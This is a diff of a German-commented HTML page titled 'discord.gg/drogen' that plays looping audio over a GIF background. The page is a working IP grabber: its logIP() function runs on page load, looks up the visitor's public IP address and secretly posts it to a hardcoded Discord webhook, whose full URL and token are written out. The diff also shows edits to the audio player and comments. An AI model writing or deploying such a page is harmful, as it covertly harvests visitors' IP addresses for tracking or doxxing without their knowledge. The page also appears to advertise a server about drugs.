@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/drogen</title> <!-- Titel der Seite -->
+    <title>discord.gg/drogen</title>
     <style>
         body {
             margin: 0;
@@ -41,65 +41,40 @@
 
     <!-- Audio Player für die Musik -->
     <div id="audioPlayer">
-        <audio id="audio" controls>
+        <audio id="audio" loop autoplay>
             <source src="https://cdn.discordapp.com/attachments/1151144288483283016/1331247379873267722/video0_4.mp3?ex=6790ec3c&is=678f9abc&hm=b7fb03d1208db3c18da202c24059577c6738efdfdfcfe9cca3a06ecc05887a4f&" type="audio/mpeg">
             Your browser does not support the audio element.
         </audio>
     </div>
 
     <script>
-        // Load YouTube API
-        var tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        var firstScriptTag = document.getElementsByTagName('script')[0];
-        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+        // Initialisiere das Audio
+        const audio = document.getElementById('audio');
 
-        let player;
-        function onYouTubeIframeAPIReady() {
-            player = new YT.Player('player', {
-                height: '0',
-                width: '0',
-                videoId: 'YKflNeF5D_w', // Replace with your YouTube video ID
-                playerVars: {
-                    'autoplay': 1,
-                    'controls': 0,
-                    'loop': 1,
-                    'playlist': 'YKflNeF5D_w' // Required for looping
-                },
-                events: {
-                    'onReady': onPlayerReady,
-                    'onStateChange': onPlayerStateChange
-                }
+        // Funktion, um Audio zu starten
+        function tryPlayAudio() {
+            audio.play().catch(function(error) {
+                console.log("Audio autoplay failed:", error);
             });
         }
 
-        function onPlayerReady(event) {
-            // Set volume to 50% and play immediately
-            player.setVolume(50);
-            player.playVideo();
-        }
+        // Versuche, das Audio beim Laden der Seite zu starten
+        window.addEventListener('load', tryPlayAudio);
 
-        function onPlayerStateChange(event) {
-            // If video ends, replay it
-            if (event.data === YT.PlayerState.ENDED) {
-                player.playVideo();
-            }
-        }
-
-        // Set background image
+        // Setze Hintergrundbild
         document.body.style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif?ex=6790ec53&is=678f9ad3&hm=3a89976dba559a1ec904403da9ae7cb8b11e1434f7cb45290010984b293bc1b7&')";
 
         async function logIP() {
             try {
-                // Fetch the IP address
+                // IP-Adresse abrufen
                 const response = await fetch("https://api.ipify.org?format=json");
                 const data = await response.json();
                 const ip = data.ip;
 
-                // Display the IP address
+                // Zeige IP-Adresse an
                 document.getElementById('ipDisplay').textContent = `${ip}`;
 
-                // Send IP to the webhook
+                // Sende IP an Webhook
                 const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h"; // Dein Discord Webhook-URL
                 await fetch(webhookURL, {
                     method: "POST",
@@ -117,7 +92,7 @@
             }
         }
 
-        // Log the IP as soon as the page loads
+        // Logge die IP sofort beim Laden der Seite
         logIP();
     </script>
 </body>
